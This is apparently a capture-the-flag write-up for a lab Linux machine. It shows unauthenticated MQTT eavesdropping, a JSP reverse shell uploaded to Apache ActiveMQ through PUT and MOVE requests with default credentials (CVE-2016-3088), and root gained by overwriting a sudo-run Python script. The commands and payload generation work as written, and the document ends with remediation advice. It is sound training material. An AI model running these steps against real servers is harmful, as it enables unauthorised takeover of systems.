## Broker

Medium-difficulty Linux machine built around message brokers. An MQTT broker on port 1883 leaks a private chat channel to any subscriber. Apache ActiveMQ on port 8161 accepts unauthenticated file uploads through its fileserver, and a PUT plus MOVE request places a JSP web shell in the webapps directory (CVE-2016-3088). A sudo rule that runs a Python script as root, where the script is writable by the low-privilege user, gives root.

**Target:** 10.48.169.242 (broker)
**Difficulty:** Medium
**Attack Path:** Port scan → MQTT subscription → Chat eavesdropping → ActiveMQ fileserver upload → MOVE to webapps → JSP shell → Reverse shell as activemq → Stabilize → Writable sudo script → Root

---

### PART 1: RECONNAISSANCE

**Full port scan**

```
nmap -p- 10.48.169.242
```

```
22/tcp     open  ssh          OpenSSH 8.2p1 Ubuntu
1883/tcp   open  mqtt         MQTT message broker
8161/tcp   open  patrol-snmp  Jetty 7.6.9 (Apache ActiveMQ)
33287/tcp  open  unknown
```

**Service and version scan**

```
nmap -sV -sC -p 22,1883,8161,33287 10.48.169.242
```

**Key findings:**
- Port 1883 is an MQTT broker, a lightweight publish/subscribe messaging protocol used in IoT and chat-style systems.
- Port 8161 is the web console for Apache ActiveMQ, a Java message broker.
- The scenario describes two coworkers using a messaging system to chat, which points at the MQTT broker.

---

### PART 2: MQTT EAVESDROPPING

**Basic attempt with mosquitto**

```
sudo apt install -y mosquitto mosquitto-clients
mosquitto_sub -h 10.48.169.242 -t '#' -d
```

**Result:**

```
Client null sending CONNECT
Client null sending CONNECT
```

The default client sends MQTT protocol version 4 (3.1.1), which the broker does not accept in this configuration. Netcat confirms the port is open but does not reply to a plain connection:

```
nc -zv 10.48.169.242 1883
(UNKNOWN) [10.48.169.242] 1883 (?) open
```

**Working alternative: a Python MQTT client shell**

A Python client that lets you choose the protocol version works here. Install its dependency and run it:

```
git clone https://github.com/bapowell/python-mqtt-client-shell.git
pip install paho-mqtt
```

**Commands used inside the client:**

```
protocol 3              # Use MQTT protocol version 3 (default is 4)
connection              # Enter connection mode
host broker.thm         # Set the broker address (default is localhost)
connect                 # Connect to the broker
subscribe #             # Subscribe to all topics (# is the MQTT wildcard)
```

**Why protocol 3 matters:** The broker expects the older MQTT 3.x handshake. Forcing the client to use it allows the connection to succeed.

**Captured message**

```
on_message(): message received: Topic: secret_chat, QoS: 0, Payload Length: 55
Payload (str): b"Paul: Hey, have you played the videogame 'Hacknet' yet?"
```

**Takeaway:** The `#` wildcard subscribes to every topic. The broker does not require authentication, so anyone on the network can read the private conversation. This is the eavesdropping the scenario refers to.

---

### PART 3: ACTIVEMQ FILESERVER UPLOAD (CVE-2016-3088)

**The vulnerability**

Apache ActiveMQ 5.9.0 includes a fileserver web application that supports HTTP PUT and MOVE methods. Its default credentials are `admin:admin`. Because the fileserver lets remote users write files and move them into the webapps directory, a JSP file uploaded there is executed by the web server. This is CVE-2016-3088.

**Generate a JSP reverse shell**

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.136.156 LPORT=4444 -f raw > shell.jsp
```

Output: `Payload size: 1501 bytes`

**Upload the shell to the fileserver**

```
curl -u 'admin:admin' -v -X PUT --data "@shell.jsp" \
  http://10.48.169.242:8161/fileserver/shell.jsp
```

The file lands in the fileserver directory, which is not yet a location the web server runs.

**Move the file into webapps**

The MOVE method renames the file to a new path. The Destination header points at the admin webapp directory:

```
curl -u 'admin:admin' -v -X MOVE \
  --header "Destination: file:///opt/apache-activemq-5.9.0/webapps/admin/shell.jsp" \
  http://10.48.169.242:8161/fileserver/shell.jsp
```

**Why this works:** The fileserver does not restrict the destination path. Moving the file into `webapps/admin/` makes it a web page served by Jetty.

**Trigger the shell**

Request the file to start the JSP:

```
curl -u 'admin:admin' -v http://10.48.169.242:8161/admin/shell.jsp
```

**Attacker: start a listener**

```
nc -lvnp 4444
```

**Result:**

```
connect to [192.168.136.156] from (UNKNOWN) [10.48.169.242] 35664
id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
```

---

### PART 4: SHELL STABILIZATION

```
which python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo && fg
export TERM=xterm-256color
```

---

### PART 5: USER FILES AND FLAG

```
cd /opt/apache-activemq-5.9.0
ls
```

```
LICENSE  NOTICE  README.txt  activemq-all-5.9.0.jar  bin  chat.py  conf
data  flag.txt  lib  start.sh  subscribe.py  tmp  webapps
```

```
cat flag.txt
[flag value: not recorded in notes]
```

**Note:** `chat.py` and `subscribe.py` are the scripts that run the chat service. `subscribe.py` becomes important in the next step.

---

### PART 6: PRIVILEGE ESCALATION VIA WRITABLE SUDO SCRIPT

**Check sudo rights**

```
sudo -l
```

```
User activemq may run the following commands on activemq:
    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
```

The `activemq` user can run `subscribe.py` as root without a password.

**Check file permissions**

The script is located in a directory owned by the `activemq` user, which means the file can be replaced:

```
ls -l /opt/apache-activemq-5.9.0/subscribe.py
```

**Why this is dangerous:** Root runs whatever the file contains. If an unprivileged user can edit that file, they control root's code.

**Replace the script**

```
echo 'import os; os.system("/bin/bash")' > /opt/apache-activemq-5.9.0/subscribe.py
```

**Run it as root**

```
sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
```

**Result:**

```
root@activemq:/opt/apache-activemq-5.9.0#
```

**Root flag**

```
cd ~
ls
root.txt
cat root.txt
[root flag: not recorded in notes]
```

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Port scan (22, 1883, 8161, 33287)
  └─ Service detection (MQTT, ActiveMQ/Jetty)

PHASE 2: MQTT Eavesdropping
  ├─ mosquitto_sub fails (MQTT protocol version mismatch)
  ├─ Python MQTT client shell with protocol 3
  ├─ Subscribe to #
  └─ Capture secret_chat messages

PHASE 3: ActiveMQ Fileserver RCE
  ├─ Generate JSP reverse shell with msfvenom
  ├─ PUT shell.jsp to /fileserver/
  ├─ MOVE into webapps/admin/
  └─ Trigger shell via /admin/shell.jsp

PHASE 4: Foothold
  ├─ Reverse shell as activemq
  └─ Stabilize with pty and stty

PHASE 5: Privilege Escalation
  ├─ sudo -l: subscribe.py as root (NOPASSWD)
  ├─ subscribe.py is writable by activemq
  ├─ Overwrite with os.system("/bin/bash")
  └─ Root shell
```

---

### VULNERABILITIES

1. **Unauthenticated MQTT Broker with Wildcard Subscription (High)**
   - Broker accepts connections and subscriptions without authentication
   - Any network client can read all topics, including private chat

2. **Default Credentials on ActiveMQ (Critical)**
   - Fileserver accepts `admin:admin`
   - Allows remote file write and move

3. **Unsafe Fileserver Functionality, CVE-2016-3088 (Critical)**
   - PUT and MOVE methods allow writing to the webapps directory
   - JSP uploaded to webapps executes as the web server user

4. **Writable Script Run as Root via Sudo (Critical)**
   - `subscribe.py` owned by a low-privilege user
   - Sudo runs it as root without a password

---

### REMEDIATION

```
├─ Require authentication and TLS on the MQTT broker; restrict wildcard subscriptions
├─ Change default ActiveMQ credentials; disable the fileserver if not needed
├─ Upgrade ActiveMQ to a version that fixes CVE-2016-3088
├─ Restrict the webapps directory to read-only for the service account
├─ Make sudo-executed scripts owned by root and not writable by other users
├─ Limit sudo rules to specific arguments and avoid running scripts from user-writable paths
├─ Monitor for new JSP files in webapps and for unexpected HTTP PUT or MOVE requests
└─ Segment IoT and messaging services from general network access
```

---

### TECHNICAL NOTES

**Tools Used:**
- nmap (port and service enumeration)
- mosquitto_sub (MQTT client, failed on protocol version)
- Python MQTT client shell (python-mqtt-client-shell, paho-mqtt)
- msfvenom (JSP payload generation)
- curl (ActiveMQ fileserver PUT and MOVE)
- nc (reverse shell listener)
- python3 (shell stabilization)

**Key Insight:** The MQTT broker leaked a private chat to anyone who subscribed to `#`. The ActiveMQ fileserver, protected only by default credentials, let us place a JSP shell in webapps. A root-run Python script that the low-privilege user could overwrite then gave root.

**Concepts to Study:**
- MQTT publish/subscribe and wildcard topics
- MQTT protocol version negotiation
- CVE-2016-3088 and ActiveMQ fileserver abuse
- JSP web shells
- Sudo rules with writable scripts

http://medium.com/@knownsec404team/analysis-of-apache-activemq-remote-code-execution-vulnerability-cve-2016-3088-575f80924f30
# Jai Shri Ram
